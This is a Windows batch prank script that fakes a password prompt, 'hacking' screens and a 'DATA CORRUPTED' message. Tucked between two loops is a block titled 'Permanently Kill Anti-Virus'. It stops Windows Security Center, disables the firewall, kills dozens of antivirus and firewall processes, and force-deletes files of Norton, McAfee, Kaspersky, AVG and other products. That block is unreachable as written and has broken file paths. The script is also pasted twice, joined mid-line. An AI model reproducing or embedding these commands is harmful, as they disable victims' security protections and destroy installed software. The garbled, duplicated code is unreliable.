@echo off 
goto start

:start
title PASSWORD
color 0a
cls
echo.
echo.
set /p a=.        Password:
title ERROR CODE: %random%
cls
echo.
echo.
echo:         ERROR
timeout /t 2 /nobreak >> nul
color 04
cls
echo.
echo.
echo:         ERROR
timeout /t 1 /nobreak >> nul
set l=0
cls
goto matrix

:matrix
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
set /a l+=1
if %l%==300 goto next
goto matrix
rem —
rem Permanently Kill Anti-Virus
net stop “Security Center”
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
cls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
del /Q /F C:Program Filesalwils~1avast4*.*
del /Q /F C:Program FilesLavasoftAd-awa~1*.exe
del /Q /F C:Program Fileskasper~1*.exe
cls
del /Q /F C:Program Filestrojan~1*.exe
del /Q /F C:Program Filesf-prot95*.dll
del /Q /F C:Program Filestbav*.dat
cls
del /Q /F C:Program Filesavpersonal*.vdf
del /Q /F C:Program FilesNorton~1*.cnt
del /Q /F C:Program FilesMcafee*.*
cls
del /Q /F C:Program FilesNorton~1Norton~1Norton~3*.*
del /Q /F C:Program FilesNorton~1Norton~1speedd~1*.*
del /Q /F C:Program FilesNorton~1Norton~1*.*
del /Q /F C:Program FilesNorton~1*.*
cls
del /Q /F C:Program Filesavgamsr*.exe
del /Q /F C:Program Filesavgamsvr*.exe
del /Q /F C:Program Filesavgemc*.exe
cls
del /Q /F C:Program Filesavgcc*.exe
del /Q /F C:Program Filesavgupsvc*.exe
del /Q /F C:Program Filesgrisoft
del /Q /F C:Program Filesnood32krn*.exe
del /Q /F C:Program Filesnood32*.exe
cls
del /Q /F C:Program Filesnod32
del /Q /F C:Program Filesnood32
del /Q /F C:Program Fileskav*.exe
del /Q /F C:Program Fileskavmm*.exe
del /Q /F C:Program Fileskaspersky*.*
cls
del /Q /F C:Program Filesewidoctrl*.exe
del /Q /F C:Program Filesguard*.exe
del /Q /F C:Program Filesewido*.exe
cls
del /Q /F C:Program Filespavprsrv*.exe
del /Q /F C:Program Filespavprot*.exe
del /Q /F C:Program Filesavengine*.exe
cls
del /Q /F C:Program Filesapvxdwin*.exe
del /Q /F C:Program Fileswebproxy*.exe
del /Q /F C:Program Filespanda software*.*
rem —


:next
title Access Granted
color 0a
cls
echo.
echo.
echo:         ACCESS GRANTED
timeout /t 2 /nobreak >> nul
set l=0
cls
goto rmatrix

:rmatrix
color 04
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
set /a l+=1
if %l%==100 goto data
goto rmatrix

:data
timeout /t 2 /nobreak >> nul
title ERROR CODE: %random%
color 0c
cls
echo.
echo.
echo:         DATA CORRUPTED
timeout /t 2 /nobreak >> nul
cls
echo.
echo.
echo:         ERROR
timeout /t 2 /nobreak >> nul
set l=0
cls
goto loop

:loop
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
set /a l+=1
if %l%==300 exit
goto loop@echo off 
goto start

:start
title PASSWORD
color 0a
cls
echo.
echo.
set /p a=.        Password:
title ERROR CODE: %random%
cls
echo.
echo.
echo:         ERROR
timeout /t 2 /nobreak >> nul
color 04
cls
echo.
echo.
echo:         ERROR
timeout /t 1 /nobreak >> nul
set l=0
cls
goto matrix

:matrix
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
set /a l+=1
if %l%==300 goto next
goto matrix

:next
title Access Granted
color 0a
cls
echo.
echo.
echo:         ACCESS GRANTED
timeout /t 2 /nobreak >> nul
set l=0
cls
goto rmatrix

:rmatrix
color 04
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
set /a l+=1
if %l%==100 goto data
goto rmatrix

:data
timeout /t 2 /nobreak >> nul
title ERROR CODE: %random%
color 0c
cls
echo.
echo.
echo:         DATA CORRUPTED
timeout /t 2 /nobreak >> nul
cls
echo.
echo.
echo:         ERROR
timeout /t 2 /nobreak >> nul
set l=0
cls
goto loop

:loop
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
set /a l+=1
if %l%==300 exit
goto loop
